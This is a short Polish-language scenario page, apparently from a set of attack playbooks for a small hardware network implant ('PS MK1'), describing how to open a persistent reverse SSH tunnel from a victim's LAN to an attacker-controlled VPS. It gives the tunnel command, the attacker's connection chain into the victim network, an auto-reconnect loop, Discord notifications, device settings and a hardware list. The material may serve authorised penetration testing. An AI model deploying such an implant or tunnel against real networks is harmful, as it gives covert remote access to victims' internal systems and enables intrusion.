# Scenariusz 5: Reverse SSH Tunnel – Zdalny dostęp do sieci ofiary

PS działa jako implant sieciowy – łączy się przez SSH z VPS (`ssh -R PORT:localhost:22`), tworząc reverse tunnel. Atakujący z dowolnego miejsca: `ssh VPS` → `ssh root@127.0.0.1 -p PORT` → PS → skanuje LAN ofiary.

Lżejsza alternatywa dla OpenVPN (nie obciąża CPU Atheros AR9331). Auto-reconnect przez while-true loop. Powiadomienia Discord.

**Switch:** 3 | **NETMODE:** BRIDGE | **Wymaga:** VPS z publicznym IP + klucz SSH

### Wymagany sprzęt

PS MK1, 2× kable Ethernet, powerbank, VPS (dowolny Linux, min. 128 MB RAM).
